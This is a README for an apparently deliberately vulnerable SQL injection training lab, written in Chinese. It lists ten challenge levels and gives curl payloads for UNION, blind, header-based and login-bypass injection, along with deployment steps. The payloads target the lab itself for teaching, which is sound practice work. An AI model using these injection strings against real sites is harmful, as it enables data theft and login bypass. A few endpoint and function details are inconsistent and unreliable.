# SQLi Labs · 墨香书屋 SQL 注入漏洞靶场

> 仿 pikachu / DVWA 结构的多关卡 SQL 注入练习平台  
> 技术栈：Python 3 + Flask + SQLite（单文件即跑）

## 快速开始

### Docker 一键部署（推荐）

```bash
# 1. 拉取代码
git clone https://github.com/yourname/sqli-labs.git
cd sqli-labs

# 2. 修改配置
cat docker-compose.yml   # 修改 FLAG / ADMIN_USER / ADMIN_PASS

# 3. 构建运行
docker compose up -d --build
```

访问 `http://yoursite:8000` → 跳转至登录页 **admin / admin123**

### 非 Docker 方式

```bash
pip install -r requirements.txt
export FLAG="FLAG{your_custom_flag}"
export ADMIN_USER="myadmin"
export ADMIN_PASS="mypass123"
python app.py
# http://127.0.0.1:8000
```

---

## 关卡概览

| # | 关卡 | 类型 | 难度 | 攻击方法 | 目标 |
|---|------|------|------|----------|------|
| 1 | `/union` | 数字型回显注入 | low | UNION SELECT | 用 `0 UNION SELECT 1,2,3,(SELECT secret FROM flag)` 把 flag 带出 |
| 2 | `/char-union` | 字符型回显注入 | low | UNION SELECT | 闭合引号后 UNION 回显 |
| 3 | `/bracket` | 括号型注入 | low | UNION SELECT | 多层括号绕过 |
| 4 | `/error` | 报错注入 | medium | 自定义函数 leak() | 异常信息中带出 flag；low 报错；high 用 `uniunionon` 绕过 union 删词 |
| 5 | `/bool` | 布尔盲注 | medium | 盲注 | 根据「订单存在 / 不存在」差异逐位爆 flag |
| 6 | `/time` | 时间盲注 | medium | sleep() 延迟 | 根据响应时间判断，slow≥2s 表示命中 |
| 7 | `/insert` | INSERT 注入 | medium | 第二指令注入 | 利用 `||` 把 flag 写进用户 bio，登录目标页「二次回显」读取 |
| 8 | `/update` | UPDATE 注入 | medium | 第二指令注入 | 同 7，把 flag 写进 lisi 的 bio |
| 9 | `/ua` | HTTP 头注入 | medium | User-Agent 注入 | 用 -A 攻击把 flag 写进访问日志，`/admin/log` 查看 |
| 10 | `/login` | 登录绕过 | low | SQL 登录注入 | `store_admin'--` 绕过密码验证拿 flag |

---

## 难度说明

- **low**：无过滤，直接拼接 SQL
- **medium**：单引号转义 `''`（字符注入失效，数字型仍可用）
- **high**：high 会 `DELETE` 关键词 `union`（可用 `uniunionon` 绕过一次）
- **impossible**：全部参数化查询，仅作安全演示

---

## 常见 Payload 速查

```bash
# 关卡 1：数字型 UNION
curl -b ck.txt "http://host:8000/challenge/num-union?id=0%20UNION%20SELECT%201,2,3,(SELECT%20secret%20FROM%20flag)"

# 关卡 5：布尔盲注
curl -b ck.txt -G "http://host:8000/challenge/bool" \
  --data-urlencode "order_no=x' OR (SELECT substr(secret,1,1) FROM flag)='F' OR '"

# 关卡 6：时间盲注
curl -b ck.txt -G "http://host:8000/challenge/time" \
  --data-urlencode "order_no=x' OR (SELECT substr(secret,1,1) FROM flag)='F' AND 1=sleep(2) OR '"

# 关卡 9：UA 注入
curl -b ck.txt -X POST "http://host:8000/challenge/ua" \
  -d "username=xxx&password=xxx" \
  -H "User-Agent: x'||(SELECT secret FROM flag)||'"
```

---

## 目录结构

```
sqli-labs/
├── app.py                 # 主程序
├── init_db.sql            # 初始化脚本（备份）
├── requirements.txt
├── Dockerfile
├── docker-compose.yml
├── README.md
└── templates/
    ├── base.html        # 通用布局
    ├── index.html       # 关卡列表
    ├── challenge.html   # 关卡操作页
    ├── login.html       # 登录页
    ├── profile.html     # 第二指令回显页
    ├── ua_log.html      # 访问日志页
    └── admin.html       # 管理面板
```

---

## 云服务器 121.43.43.25 部署指南

> 以下假设您的云服务器 IP 为 **121.43.43.25**，以下端口号可选 22/80/443/8000。

### 方式 1：Docker compose（推荐）

```bash
# 1. SSH 登录云服务器
ssh root@121.43.43.25

# 2. 安装依赖（Ubuntu 示例）
apt update && apt install -y docker.io docker-compose git

# 3. 拉取代码
git clone https://github.com/yourname/sqli-labs.git
cd sqli-labs

# 4. 修改配置
cat docker-compose.yml

# 5. 修改 FLAG 等敏感信息（建议放在文件里）
export FLAG="FLAG{flag_here}"
export ADMIN_PASS="secure_password_$(head -c 16 /dev/urandom | md5sum)"
```

### 方式 2：Gunicorn 生产跑（性能更好）

```bash
# 安装
pip install gunicorn

# 运行
gunicorn -w 4 -b 0.0.0.0:8000 "app:app"
```

### 方式 3：Nginx 反向代理

```nginx
server {
    listen 80;
    server_name 121.43.43.25;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

### 防火墙放行

```bash
# Ubuntu / firewalld
ufw allow 8000/tcp
# 或者
firewall-cmd --add-port=8000/tcp --permanent && firewall-cmd --reload
```

### 反向访问

- http://121.43.43.25:8000 → 登录页
- 登录后进入关卡列表 → 选择挑战

---

## 安全提醒

- 该靶场**故意存 SQL 注入漏洞**，仅供**授权环境**下的教学；
- 部署到公网前务必修改 `FLAG`、`ADMIN_PASS`、`SECRET_KEY`；
- 生产环境建议用 **HTTPS + Nginx 反代 + 非根权限运行**。

---

## 答疑

- Q: 如何提交 Flag？
  A: 只需在对应关卡的 payload 中出现 FLAG，或用「提交 flag」表单验证。

- Q: Docker 内如何查看日志？
  A: `docker logs -f sqli-labs`

- Q: 数据库文件在哪？
  A: 项目根目录 `lab.db`，容器内为 `/app/lab.db`。

---

> 项目仅用于安全学习，版权归作者所有。